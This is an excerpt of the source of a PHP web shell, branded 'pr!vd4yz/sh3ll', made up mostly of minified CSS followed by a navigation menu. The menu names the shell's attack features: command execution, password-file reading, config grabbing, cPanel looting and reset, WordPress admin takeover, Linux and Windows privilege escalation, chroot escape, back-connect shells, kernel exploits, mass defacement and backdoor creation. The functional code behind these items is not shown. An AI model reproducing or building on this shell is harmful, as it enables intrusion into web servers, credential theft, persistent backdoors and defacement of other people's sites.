#fdecec}.pr1vd4yz-ex-chain-title{color:#e53935;font-size:1.14em;letter-spacing:.03em}.pr1vd4yz-ex-chain-close{font-size:1.7em;color:#b71c1c;background:0 0;border:none;line-height:1;padding:0 9px;border-radius:7px;margin-left:auto}.pr1vd4yz-ex-chain-term,.pr1vd4yz-exterm-input{color:#ffe6e6;font-family:'JetBrains Mono','Fira Mono',monospace;font-size:1.05em;outline:0}.pr1vd4yz-ex-chain-term{background:#191a1c;padding:15px 13px 10px;max-height:54vh;min-height:220px;overflow-y:auto;border-radius:0 0 11px 11px;white-space:pre-wrap;user-select:text}.pr1vd4yz-exterm-input{background:#181a1c;width:100%;border:none;padding:10px 13px;border-top:1.2px solid #fdecec;border-radius:0 0 9px 9px;letter-spacing:.02em}.fileedit-modal,.fileedit-path,.fileedit-textarea{font-family:'Fira Mono',monospace}.fileedit-modal-bg{position:fixed;inset:0;z-index:13500;display:flex;align-items:center;justify-content:center;background:rgba(35,24,32,.19);padding:0}.fileedit-modal{background:#fff;border-radius:17px;border:2.2px solid #e53935;max-width:1024x;width:70vw;min-width:0;max-height:93vh;padding:0;box-shadow:0 8px 44px #b71c1c18;display:flex;flex-direction:column;overflow:hidden}.fileedit-header{display:flex;align-items:center;gap:16px;border-radius:17px 17px 0 0;padding:17px 24px 11px 20px;border-bottom:1.5px solid #fdecec;background:linear-gradient(90deg,#fff,#fff7f7 93%,#ffe3e3)}.fileedit-icon{color:#fff;background:#e53935;font-size:1.6em;border-radius:11px;width:39px;height:39px;display:flex;align-items:center;justify-content:center;box-shadow:0 1px 11px #ff9b9b}.fileedit-title{font-size:1.13em;color:#e53935;letter-spacing:.03em;margin-bottom:2px;text-transform:lowercase}.fileedit-path{color:#b71c1c;font-size:.99em;opacity:.83}.fileedit-close{background:0 0;border:none;font-size:1.6em;color:#b71c1c;border-radius:8px;cursor:pointer;transition:background .14s,color .13s;margin-left:auto}.fileedit-textarea-wrap{flex:1 1 0;display:flex;flex-direction:column;background:#fff}.fileedit-textarea{width:98%;min-height:340px;height:340px;max-height:66vh;resize:vertical;border-radius:11px;border:1.5px solid #fdecec;margin-bottom:8px;font-size:1.11em;color:#e53935;background:#fff;padding:19px 13px 13px;box-shadow:0 2px 17px #e5393513;outline:0;transition:border .12s;line-height:1.55;white-space:pre;tab-size:4;overflow-x:auto!important;overflow-y:auto!important}.cmdnirvana-btn,.fileedit-btn{border-radius:8px;cursor:pointer}.fileedit-textarea:focus{border-color:#e53935;background:#fff7f7}.fileedit-actions{display:flex;gap:12px;justify-content:flex-end;padding:10px 22px 0 18px}.fileedit-btn{padding:9px 22px;font-size:1.09em;border:none;transition:background .13s,color .13s,border .12s;font-family:inherit}.fileedit-btn-save{background:#e53935;color:#fff;border:1.2px solid #e53935}.fileedit-statusbar{padding:8px 20px 0 16px;font-size:.98em;color:#b71c1c;opacity:.92;display:flex;align-items:center;gap:16px;font-family:'Fira Mono',monospace}.fileedit-statusbar span{color:#b71c1c;font-size:1em}.fileedit-result{margin:8px 22px 0;font-size:1.07em}.fileedit-modal ::-webkit-scrollbar,.fileedit-textarea::-webkit-scrollbar{width:11px;height:11px;background:#fdecec;border-radius:9px}.fileedit-modal ::-webkit-scrollbar-thumb,.fileedit-textarea::-webkit-scrollbar-thumb{background:#e53935;border-radius:7px;border:2.5px solid #fdecec}.fileedit-modal ::-webkit-scrollbar-thumb:hover,.fileedit-textarea::-webkit-scrollbar-thumb:hover{background:#b71c1c}.fileedit-modal ::-webkit-scrollbar-corner,.fileedit-textarea::-webkit-scrollbar-corner{background:#fdecec}.fileedit-modal,.fileedit-textarea{scrollbar-width:thin;scrollbar-color:#e53935 #fdecec}.pr1v-menu-horizontal{display:flex;flex-direction:row;justify-content:space-between;align-items:flex-start;gap:12px;padding:0 10px 7px;background:#fff7f7;border-bottom:1.2px solid #fdecec}.pr1v-menu-box{background:#fff;border:1.2px solid #fdecec;border-radius:11px;min-width:150px;max-width:185px;flex:1 1 0;padding:7px 12px 8px;margin:0 4px;box-shadow:0 2px 12px #e5393511;display:flex;flex-direction:column;align-items:flex-start}.pr1v-menu-head{font-size:.98em;color:#e53935;margin-bottom:3px;letter-spacing:.04em}.pr1v-menu-box ul{list-style:none;margin:0;padding:0}.pr1v-menu-box ul li{margin:0 0 2px}.pr1v-menu-box ul li a{display:flex;align-items:center;gap:7px;font-size:.94em;padding:4px 0;color:#b71c1c;border-radius:6px;text-decoration:none;opacity:.93;transition:background .14s,color .13s}.pr1v-menu-box ul li a:hover,.pzloot-table th{background:#fdecec;color:#e53935}.pr1v-menu-box i{font-size:1em;min-width:19px;text-align:center;opacity:.84}@media (max-width:950px){.pr1v-menu-horizontal{flex-direction:column}.pr1v-menu-box{max-width:100vw;min-width:0;margin:0 0 10px}}.cmdnirvana-modal-bg{position:fixed;inset:0;z-index:14444;background:rgba(35,24,32,.21);display:flex;align-items:center;justify-content:center}.cmdnirvana-modal{background:#fff;border-radius:15px;border:2.2px solid #444;max-width:550px;width:99vw;min-width:0;max-height:97vh;box-shadow:0 9px 44px #2d26264c;display:flex;flex-direction:column;overflow:hidden}.cmdnirvana-header{display:flex;align-items:center;gap:18px;border-radius:15px 15px 0 0;padding:18px 24px 13px;border-bottom:1.5px solid #fdecec;background:linear-gradient(90deg,#fff,#fff7f7 93%,#ffe3e3)}.cmdnirvana-ico{color:#fff;background:#0c0328;font-size:1.5em;border-radius:11px;width:38px;height:38px;display:flex;align-items:center;justify-content:center;box-shadow:0 1px 11px #6366f1}.cmdnirvana-title{font-size:1.13em;color:#0c0328;letter-spacing:.03em;margin-bottom:2px;text-transform:lowercase}.cmdnirvana-desc{color:#1a1a1a;font-size:.97em;opacity:.89;letter-spacing:.01em}.cmdnirvana-close{background:0 0;border:none;font-size:1.7em;color:#222;border-radius:8px;cursor:pointer;transition:background .14s,color .13s;margin-left:auto}.cmdnirvana-close:hover{color:#fff;background:#222}.cmdnirvana-content{padding:22px 20px 19px}.cmdnirvana-inputbox{margin-bottom:13px}.cmdnirvana-inputlabel{color:#222;font-size:1.09em;margin-bottom:6px;display:block}.cmdnirvana-cmdinput{width:98%;font-size:1.09em;padding:13px 9px;border:1.2px solid #d3d3d3;border-radius:7px;background:#fff;color:#222;outline:0;font-family:inherit;transition:border .15s}.cmdnirvana-cmdinput:focus{border-color:#222}.cmdnirvana-btn{padding:10px 26px;font-size:1.07em;border:none;background:#222;color:#fff;transition:background .12s}.cmdnirvana-btn:hover{background:#0c0328}.cmdnirvana-outputlabel{color:#444;font-size:1.07em;margin:19px 0 5px;display:block}.cmdnirvana-output{width:97%;min-height:200px;max-height:240px;font-size:1.08em;background:#111113;color:#33fd9b;border-radius:8px;border:1.1px solid #15181b;font-family:'JetBrains Mono','Fira Mono',monospace;padding:13px 11px;line-height:1.48;resize:vertical;overflow:auto}.chroot-escape-method .mout,.pzcard-main,.pzloot-main{font-family:'Fira Mono',monospace}.pzcard-main{box-shadow:0 8px 44px #e5393513;overflow:hidden}.pzcard-icon{display:flex;align-items:center;justify-content:center;box-shadow:0 2px 13px #ffb3b3}.pzcard-main{box-shadow:0 2px 24px #e5393515;padding:0}.pzcard-header{display:flex;align-items:center;gap:15px}.pzcard-icon{display:flex;align-items:center;justify-content:center}.pzcard-title{flex:1}.pzcard-desc{opacity:.85}.pzcard-form-row{display:flex;flex-direction:column;gap:7px;margin-bottom:11px}.pzcard-header,.pzcard-info{align-items:center;display:flex}.pzcard-label{font-size:.99em;color:#b71c1c;margin-bottom:3px}.pzcard-input,.pzcard-textarea{width:100%;font-size:1.07em;padding:10px 9px;border:1.2px solid #fdecec;border-radius:7px;background:#fff;color:#e53935;outline:0;transition:border .14s}.pzcard-btn-red{background:#e53935}.pzcard-info{gap:7px;gap:11px}.pzcard-table-wrap{overflow-x:auto;background:#fff;border-radius:10px;box-shadow:0 1px 8px #e5393511;margin-top:16px;overflow:auto}.pzcard-table{width:100%;font-size:1em}.pzcard-table td,.pzcard-table th{padding:8px 11px;text-align:left;border-bottom:1px solid #fdecec}.pzcard-table th{color:#e53935;background:#fff5f5}.pzcard-table tr:last-child td{border-bottom:none}.pzcard-btn{border:1.5px solid #e53935}.pzcard-alert{background:#fff7f7;border:1.3px solid #fdecec;color:#e53935;font-size:1.11em;border-radius:8px;margin:17px 0 11px;padding:13px 18px}.pzcard-shells-list{margin:14px 0 0;padding-left:18px}.pzcard-shells-list li{margin-bottom:7px;line-height:1.6}.pzcard-shells-list code{background:#f8eaea;padding:2px 8px;border-radius:6px;color:#b71c1c;font-size:.97em}.pzcard-shells-list a{color:#e53935;text-decoration:underline}.pzcard-shells-list span{font-size:90%;color:#7e1111}@media (max-width:900px){.prv-menu-grid{grid-template-columns:repeat(auto-fit,minmax(90px,1fr));font-size:.97em;padding:8px}.prv-chip{padding:7px 5px}.prv-header2-bar{flex-direction:column;align-items:flex-start;gap:15px}.prv-header2-actions{flex-wrap:wrap}.prv-header2-btn{font-size:.96em;padding:7px 11px}}@media (max-width:600px){.cmdnirvana-modal,.pr1vd4yz-root-modal{max-width:99vw}.pr1vd4yz-root-content{padding:13px 5vw 12px}.prv-header-bar{padding:10px 7px}.prv-menu-grid{padding:4px 3px;gap:3px}.prv-chip{font-size:.94em}.fileedit-modal{max-width:100vw;border-radius:0}.cmdnirvana-content,.cmdnirvana-header,.fileedit-actions,.fileedit-header,.fileedit-result,.fileedit-statusbar{padding-left:7px;padding-right:7px}.fileedit-textarea{min-height:90px;height:110px}.cmdnirvana-output{min-height:75px;max-height:130px}.pzcard-content,.pzcard-header{padding:10px}.pzcard-table td,.pzcard-table th{font-size:.97em}.pzcard-main{margin:14px 1vw}.pzcard-title{font-size:1.09em}}.pzcard-main{box-shadow:0 4px 38px #e5393521}.pzcard-header{gap:17px;background:linear-gradient(90deg,#fff,#fff7f7 90%,#ffe3e3)}.pzcard-icon{display:flex;align-items:center;justify-content:center;box-shadow:0 2px 14px #e5393550}.pzcard-desc{opacity:.82;display:block;opacity:.81;margin-top:1px}.pzcard-header,.pzcard-info{display:flex;align-items:center}.pzcard-content{background:#fff;border-radius:0 0 18px 18px}.pzcard-info{box-shadow:0 2px 16px #f871711a;gap:10px}.chroot-escape-results{margin:21px 0 7px}.chroot-escape-method{background:#fff7f7;margin-bottom:11px;border-radius:7px;border:1.5px solid #fdecec;padding:13px 15px 10px 17px}.chroot-escape-method .mname{color:#e53935;font-size:1.08em}.chroot-escape-method .mout{margin-top:7px;color:#212121;font-size:.98em;background:#fbeaea;padding:8px 9px 7px 11px;border-radius:6px}.chroot-escape-method .msuccess{color:#10b981}@media (max-width:900px){.pzcard-content,.pzcard-main{max-width:99vw;padding-left:3vw;padding-right:3vw}}@media (max-width:600px){.pzcard-main{margin:11px 1vw}.pzcard-content,.pzcard-header{padding-left:7px;padding-right:7px}}.pzcard-main{box-shadow:0 6px 24px #e5393527}.pzcard-header{gap:14px;border-radius:17px 17px 0 0}.pzcard-icon,.pzloot-head{display:flex;align-items:center}.pzcard-icon{justify-content:center;box-shadow:0 1px 8px #ff9b9b}.pzcard-title{letter-spacing:.01em;letter-spacing:.03em;margin-bottom:2px}.pzcard-info{background:#fff4f4;border-radius:8px;padding:8px 13px;border:1px solid #fdecec;color:#b71c1c;margin-bottom:11px;font-size:1.06em}.pzcard-inp{width:100%;outline:0}.pzcard-btn-red:hover,.pzcard-btn:hover,.wp_pr1vd00r-btn:active{background:#b71c1c}.pzloot-main{background:#fff;border-radius:14px;box-shadow:0 2px 24px #e5393530;border:1.5px solid #fdecec;max-width:1100px;margin:33px auto}.pzloot-head{gap:16px;padding:17px 18px 11px 21px;border-bottom:1.5px solid #e5e9ef}.pzcard-header,.pzloot-ico{display:flex;align-items:center}.pzloot-ico{color:#fff;background:#e53935;font-size:1.27em;border-radius:12px;width:40px;height:40px;justify-content:center;box-shadow:0 1px 10px #ff9b9b}.pzcard-linkbtn:hover,.pzloot-badge{background:#fdecec}.pzloot-tit{font-size:1.08em;color:#e53935;letter-spacing:.03em}.pzloot-content{padding:19px 14px 22px}.pzloot-table{width:100%;font-size:.98em}.pzloot-table td,.pzloot-table th{border:1.1px solid #fdecec;padding:6px 8px;text-align:left}.pzloot-badge{color:#e53935;border-radius:7px;padding:2px 11px;font-size:.93em;margin-right:7px}.pzloot-path{color:#b71c1c;font-family:monospace;font-size:.96em}.pzloot-key{color:#fb923c}.pzloot-code{background:#fffbe7;padding:2px 7px;border-radius:6px;font-size:.95em}.pzloot-copy{background:#fffbe7;color:#e53935;border-radius:7px;padding:2px 8px;font-size:.92em;cursor:pointer;border:none;margin-left:5px}.pzloot-stepbtn{background:#e53935;color:#fff;border:none;padding:10px 26px;font-size:1.09em;border-radius:9px;cursor:pointer;margin-bottom:15px}.pzloot-stepbtn:disabled{background:#fdecec;color:#e53935;opacity:.7}.pzloot-status{font-size:1em;color:#b71c1c;margin-top:8px}.pzcard-main{background:#fff;max-width:700px;margin:35px auto 0;border-radius:15px;box-shadow:0 2px 40px #e5393533;border:2px solid #fdecec}.pzcard-header{gap:13px;padding:20px 18px 9px;border-bottom:1.5px solid #fdecec}.pzcard-icon,.pzcard-logitem{display:flex;align-items:center}.pzcard-icon{width:43px;height:43px;justify-content:center;font-size:2.1em;border-radius:13px;background:#e53935;color:#fff;box-shadow:0 2px 14px #ffbcc8}.pzcard-title{font-size:1.11em;color:#e53935}.pzcard-desc{opacity:.87;font-size:.97em;color:#3e1b21;opacity:.76}.pzcard-content{padding:17px 19px 23px}.pzcard-formrow{display:flex;gap:8px;margin-bottom:18px}.pzcard-inp{flex:1 1 0;padding:13px 11px;font-size:1.1em;border:1.4px solid #fdecec;border-radius:8px;background:#fff;color:#e53935}.pzcard-btn{background:#e53935;color:#fff;border:none;border-radius:8px;padding:13px 27px;font-size:1.09em;cursor:pointer;transition:background .14s}.pzcard-loglist{margin-top:14px;background:#fff7f7;border:1.3px solid #fdecec;border-radius:9px;padding:11px 11px 7px;max-height:270px;overflow:auto;font-size:1.03em}.pzcard-logitem{gap:7px;padding:7px 0;border-bottom:1px solid #f5bdbd;font-family:'Fira Mono',monospace}.pzcard-logitem-success{color:#009943}.prv-fm-btn,.pzcard-linkbtn{color:#e53935;background:#fff}.pzcard-linkout{display:block;padding:12px 0 2px}.pzcard-linkbtn{border:1.4px solid #fdecec;border-radius:7px;padding:8px 17px;font-size:.99em;margin-top:4px}.prv-fm-actions{display:flex;gap:6px;align-items:center;flex-wrap:wrap;padding:6px 0 2px;background:#fff}.prv-fm-btn{display:inline-flex;align-items:center;gap:4px;padding:3.5px 9px 3.5px 7px;font-size:13px;margin-right:1px;cursor:pointer;transition:background .16s,color .13s,border .15s;min-height:23px;min-width:0;font-family:inherit;letter-spacing:.01em}.prv-fm-btn i{font-size:1em;margin-right:1px}.prv-fm-btn:focus,.prv-fm-btn:hover{background:#fff3f2;color:#b71c1c;border-color:#e53935}.prv-fm-btn-green{color:red;border:1px solid #b2e9cb}.prv-fm-btn-green:focus,.prv-fm-btn-green:hover{background:#fff;color:#137a33;border-color:#13bb56}.prv-fm-upload{display:flex;align-items:center;gap:0;margin:0 2px 0 0}.prv-fm-upload input[type=file]+label+button,.prv-fm-upload label+button{margin-left:8px!important}.wp_pr1vd00r-main{background:#fff;border-radius:20px;box-shadow:0 4px 32px #0002;max-width:860px;margin:42px auto 54px;padding:32px 24px;font-family:Inter,'Fira Mono','JetBrains Mono',monospace}.wp_pr1vd00r-title{color:#e53935;font-size:1.44em;font-weight:700;margin-bottom:8px;display:flex;align-items:center;gap:12px;letter-spacing:.01em}.wp_pr1vd00r-desc{color:#888;font-size:1em;margin-bottom:23px}.wp_pr1vd00r-alert{padding:14px 16px;border-radius:8px;background:#fbe9e7;color:#b71c1c;font-weight:500;margin-bottom:22px;box-shadow:0 1px 6px #e5393512;font-size:1.07em;position:relative}.wp_pr1vd00r-alert.ok{background:#e0f7fa;color:#167b61;border:1.3px solid #10b98150}.wp_pr1vd00r-site{margin-bottom:36px;border:1.5px solid #fdecec;border-radius:13px;padding:20px 18px 18px;box-shadow:0 2px 14px #e5393505}.wp_pr1vd00r-header{display:flex;flex-wrap:wrap;align-items:center;gap:13px;margin-bottom:15px}.wp_pr1vd00r-path{font-weight:700;color:#e53935;font-size:1.08em;margin-right:16px;word-break:break-all}.wp_pr1vd00r-version{color:#b71c1c;font-size:.97em;margin-right:10px;background:#fff2f2;border-radius:5px;padding:2px 9px;font-weight:500}.wp_pr1vd00r-dbinfo{font-size:.97em;background:#f8fafb;color:#607d8b;padding:7px 14px;border-radius:7px;margin-left:auto;min-width:160px;text-align:right}.wp_pr1vd00r-users{margin-top:9px;overflow-x:auto}.wp_pr1vd00r-users table{width:100%;font-size:.97em}.wp_pr1vd00r-users td,.wp_pr1vd00r-users th{padding:7px;border-bottom:1.2px solid #fdecec;text-align:left;vertical-align:middle}.wp_pr1vd00r-users th{color:#e53935;font-weight:600;background:#fff5f5}.wp_pr1vd00r-users tr:hover{background:#fff6f6}.wp_pr1vd00r-btn{display:inline-block;padding:4px 14px;margin:2px;border:0;border-radius:7px;background:#e53935;color:#fff;font-size:.97em;font-weight:600;cursor:pointer;transition:background .13s}.wp_pr1vd00r-btn-blue{background:#1976d2}.wp_pr1vd00r-btn-green{background:#10b981}.wp_pr1vd00r-btn-copy{background:#fff;border:1.3px solid #e53935;color:#e53935;font-weight:500;padding:4px 10px;font-size:.93em;margin-left:3px}.wp_pr1vd00r-btn.wp_pr1vd00r-btn-blue,.wp_pr1vd00r-loginlink{background:linear-gradient(90deg,#ff6464 0,#e53935 100%);color:#fff!important;border:none;border-radius:20px;box-shadow:0 1.5px 8px #e5393535;font-weight:600;font-size:.99em;letter-spacing:.01em;padding:7px 21px;margin:0 0 0 4px;display:inline-block;transition:background .13s,box-shadow .16s,transform .12s;outline:0;position:relative}.wp_pr1vd00r-btn.wp_pr1vd00r-btn-blue:hover,.wp_pr1vd00r-loginlink:hover{background:linear-gradient(90deg,#e53935 0,#ff2323 100%);box-shadow:0 4px 16px #e5393524;transform:translateY(-2px) scale(1.04);color:#fff!important;text-decoration:none}.wp_pr1vd00r-pw{font-family:'JetBrains Mono','Fira Mono',monospace;font-size:.95em;color:#1976d2;padding:1px 8px;border-radius:5px;background:#f1faff;margin-left:3px}@media (max-width:600px){.prv-fm-actions{flex-wrap:wrap;gap:3px}.prv-fm-btn{padding:2.5px 7px;font-size:12px}.wp_pr1vd00r-btn.wp_pr1vd00r-btn-blue,.wp_pr1vd00r-loginlink{width:100%;margin:7px 0 0;padding:10px 0;font-size:1.07em;border-radius:13px}.wp_pr1vd00r-main{padding:12px 2vw}.wp_pr1vd00r-site{padding:11px 4px}.wp_pr1vd00r-header{flex-direction:column;gap:7px}.wp_pr1vd00r-dbinfo{min-width:0;text-align:left}.wp_pr1vd00r-users td,.wp_pr1vd00r-users th{font-size:.95em}}.terminal-shell{background:#181818;color:#80ff80;font-family:"Fira Mono",Consolas,Menlo,monospace;padding:24px;border-radius:12px;min-height:340px;max-width:780px;margin:24px 0;box-shadow:0 4px 24px #000a;font-size:1.08em;line-height:1.6}.terminal-cmd{color:#00ffe1}.terminal-out{color:#c4ffc4;margin-left:18px;white-space:pre-wrap}.terminal-fail{color:#ff6767;margin-left:18px}.terminal-prompt{color:#3cff0b}.terminal-btn{margin-top:18px;padding:10px 28px;border-radius:8px;background:#262626;border:0;color:#80ff80;cursor:pointer;font-size:1.01em;transition:.13s;box-shadow:0 1px 6px #0006}.terminal-btn:hover{background:#0f0f0f}#pr1vd4yz-file-modal-bg{position:fixed;inset:0;z-index:9999;background:rgba(255,244,244,0.96);display:flex;align-items:center;justify-content:center;}#pr1vd4yz-file-modal{background:#fff;border-radius:20px;max-width:669px;width:98vw;box-shadow:0 18px 60px #ad145730,0 0 0 2px #fdecec;border:2px solid #fdecec;font-family:'Fira Mono','Inter',Arial;display:flex;flex-direction:column;overflow:hidden;margin:0 auto;position:relative;}#pr1vd4yz-file-modal .editor-header{display:flex;align-items:center;gap:17px;border-radius:20px 20px 0 0;padding:28px 36px 17px 36px;background:#fdf4f8;border-bottom:1.7px solid #f9deed;min-height:58px;position:relative;}#pr1vd4yz-file-modal .editor-icon{background:#e53935;color:#fff;font-size:1.65em;border-radius:10px;width:44px;height:44px;display:flex;align-items:center;justify-content:center;box-shadow:0 1px 10px #ffb1b1;}#pr1vd4yz-file-modal .editor-title{font-size:1.20em;color:#ad1457;font-weight:bold;margin-bottom:1px;letter-spacing:.01em;text-transform:lowercase;}#pr1vd4yz-file-modal .editor-path{color:#e53935;font-size:1.01em;opacity:0.92;font-family:'Fira Mono',monospace;margin-top:3px;}#pr1vd4yz-file-modal .editor-close-btn{font-size:1.6em;color:#ad1457;background:none;border:none;text-decoration:none;line-height:1;padding:0 10px;border-radius:8px;position:absolute;right:18px;top:13px;cursor:pointer;transition:background .15s,color .13s;z-index:2;}#pr1vd4yz-file-modal .editor-close-btn:hover{color:#fff;background:#e53935;}#pr1vd4yz-file-modal .editor-form{display:flex;flex-direction:column;padding:0;margin:0;}#pr1vd4yz-file-modal .editor-textarea-wrap{margin:0;background:#fff4f4;}#pr1vd4yz-file-modal textarea.editor-textarea{height:280px;width:95%;font-size:1.13em;resize:vertical;min-height:110px;border:none;outline:none;background:#fff4f4;color:#ad1457;padding:17px 19px;font-family:'Fira Mono',monospace;border-bottom:2px solid #fdecec;border-radius:0 0 13px 13px;transition:background .12s,color .13s,border .13s;box-sizing:border-box;}#pr1vd4yz-file-modal textarea.editor-textarea:focus{background:#fff;color:#e53935;border-bottom:2px solid #e53935;}#pr1vd4yz-file-modal .editor-actions{display:flex;justify-content:flex-end;gap:18px;border-top:1.7px solid #fdecec;padding:20px 34px 17px 34px;background:#fff4f4;border-radius:0 0 20px 20px;}#pr1vd4yz-file-modal .editor-btn{padding:11px 31px;border-radius:8px;font-size:1.08em;border:none;cursor:pointer;display:flex;align-items:center;gap:9px;font-family:inherit;outline:none;transition:background .13s,color .13s,border .12s,box-shadow .13s;box-shadow:0 1px 7px #e5393520;text-shadow:0 1px 0 #fff4f4;}#pr1vd4yz-file-modal .editor-btn-save{background:linear-gradient(92deg,#e53935 60%,#b71c1c 120%);color:#fff;border:1.1px solid #e53935;font-weight:600;}#pr1vd4yz-file-modal .editor-btn-save:hover{background:#b71c1c;border-color:#b71c1c;}#pr1vd4yz-file-modal .editor-btn-cancel{background:#fff;color:#e53935;border:1.1px solid #fdecec;font-weight:600;}#pr1vd4yz-file-modal .editor-btn-cancel:hover{background:#fdecec;color:#b71c1c;}#pr1vd4yz-file-modal .editor-statusbar{font-size:1.04em;color:#ad1457;padding:10px 34px 8px 34px;background:#fff;border-radius:0 0 18px 18px;display:flex;justify-content:space-between;gap:17px;box-shadow:0 -2px 10px #b71c1c10;border-top:1.1px solid #fdecec;}#pr1vd4yz-file-modal .editor-result{font-size:1.09em;padding:9px 34px 6px 34px;color:#e53935;font-weight:bold;min-height:23px;background:#fffbe8;border-radius:0 0 14px 14px;margin-bottom:2px;box-shadow:0 1px 7px #fdecec30;}@media (max-width:900px){#pr1vd4yz-file-modal{max-width:99vw;border-radius:14px;}#pr1vd4yz-file-modal .editor-header,#pr1vd4yz-file-modal .editor-actions,#pr1vd4yz-file-modal .editor-statusbar{padding-left:4vw;padding-right:4vw;}#pr1vd4yz-file-modal textarea{padding:8px 7px;font-size:15px;min-height:90px;}}@media (max-width:650px){#pr1vd4yz-file-modal{max-width:100vw;border-radius:8px;}#pr1vd4yz-file-modal .editor-header,#pr1vd4yz-file-modal .editor-actions,#pr1vd4yz-file-modal .editor-statusbar{padding-left:10px;padding-right:10px;min-height:unset;}#pr1vd4yz-file-modal .editor-icon{width:32px;height:32px;font-size:1.13em;}#pr1vd4yz-file-modal .editor-title{font-size:1em;}#pr1vd4yz-file-modal textarea.editor-textarea{font-size:.96em;min-height:60px;padding:8px 5px;}#pr1vd4yz-file-modal .editor-btn{font-size:.95em;padding:7px 13px;}#pr1vd4yz-file-modal .editor-close-btn{font-size:1.1em;right:8px;top:8px;}}
@keyframes pdz-fadeInDown{from{opacity:0;transform:translate3d(0,-100%,0)}to{opacity:1;transform:translate3d(0,0,0)}}
@keyframes pdz-shakeX{10%,90%{transform:translate3d(-1px,0,0)}20%,80%{transform:translate3d(2px,0,0)}30%,50%,70%{transform:translate3d(-4px,0,0)}40%,60%{transform:translate3d(4px,0,0)}}
.fa-brain-circuit:before{content:"\f5dc"}
.animate__animated{animation-duration:1s;animation-fill-mode:both}
.animate__fadeInDown{animation-name:pdz-fadeInDown}
.animate__shakeX{animation-name:pdz-shakeX}
</style>
</head>
<header class="prv-header">
  <div class="prv-header2-bar">
    <div class="prv-logo2">
    <span class="prv-logo2-led"></span>
    <span class="prv-logo2-txt">pr!vd4yz<b class="prv-ver2">/sh3ll</b></span>
    <span class="prv-logo2-dot"></span>
    </div>
  </div>
  <nav class="prv-menu">
    <ul class="prv-menu-grid">
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&cmdnirvana" class="prv-chip"><i class="fas fa-terminal"></i><span>./cmd@pr1v</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&pr1vd4yz=cm7" class="prv-chip"><i class="fab fa-redhat"></i><span>cmd</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&multicgi" class="prv-chip"><i class="fas fa-ghost"></i> generate cgi/perl</a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&domains" class="prv-chip"><i class="fas fa-globe"></i> <span>all d0mains</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&passwd" class="prv-chip"><i class="fas fa-key"></i> <span>p4sswd (users)</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&symlink" class="prv-chip"><i class="fas fa-link"></i> <span>syml1nk</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&symlinkescaper" class="prv-chip"><i class="fas fa-link"></i> <span>syml1nk esc4per</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&massconfgrab" class="prv-chip"><i class="fas fa-link"></i> <span>m4ss c0nfig gr4pper</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&configsearcher" class="prv-chip">  <i class="fas fa-search-dollar"></i><span>c0nfig search3r</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&safem0d" class="prv-chip"><i class="fas fa-biohazard" style="color:#e53935;"></i><span>safem0d k1ll3r</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&minisql" class="prv-chip"> <i class="fas fa-database"></i><span>sql manager</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&cpanelreset" class="prv-chip"><i class="fab fa-cpanel"></i><span>cpanel email reset</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&cpanel_auto_loot" class="prv-chip"><i class="fas fa-skull-crossbones"></i><span>cpanel loot</span></a></li>
     <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&wp_pr1vd00r" class="prv-chip"><i class="fab fa-wordpress"></i> <span>wp auto hunter & admin reset</small></span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&createadmin" class="prv-chip"><i class="fab fa-wordpress"></i> <span>wp create admin</small></span></a></li>
    </ul>
    <ul class="prv-menu-grid">
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&pr1vd4yz_auto_r00t" class="prv-chip"><i class="fas fa-user-shield"></i><span>linux auto r00t</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&winr00t" class="prv-chip"><i class="fas fa-user-shield"></i><span>windows ultra admin creat0r bypass</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&chrootescape" class="prv-chip"><i class="fas fa-bug"></i><span>chroot/jailbreak escaper</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&backconnect" class="prv-chip"><i class="fas fa-link"></i><span>bc0nn3ct</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&kernelcheck" class="prv-chip"><i class="fas fa-bug"></i> <span>kernel expl0it</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&rootsuggest" class="prv-chip"><i class="fas fa-user-secret"></i> <span>r00t escalate</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&massdeface" class="prv-chip"><i class="fas fa-skull-crossbones" style="color:#e53935;"></i><span>m4ss d3face</span></a></li>
    <li> <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&filehunter" class="prv-chip"> <i class="fas fa-shield-virus" style="color:#374151;"></i> <span>backd00r scanner</span></a>
    <li> <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&b4ckd00rcr3at3" class="prv-chip"> <i class="fas fa-shield-virus" style="color:#374151;"></i> <span>backd00r creat0r</span></a>
    </ul>  
    <ul class="prv-menu-grid">
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&ziptool" class="prv-chip"><i class="fas fa-file-archive"></i> <span>z1p/unz1p</span></a></li>
    <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&remup" class="prv-chip"><i class="fas fa-cloud-arrow-down"></i> <span>r3m0t3 upload</span></a></li>
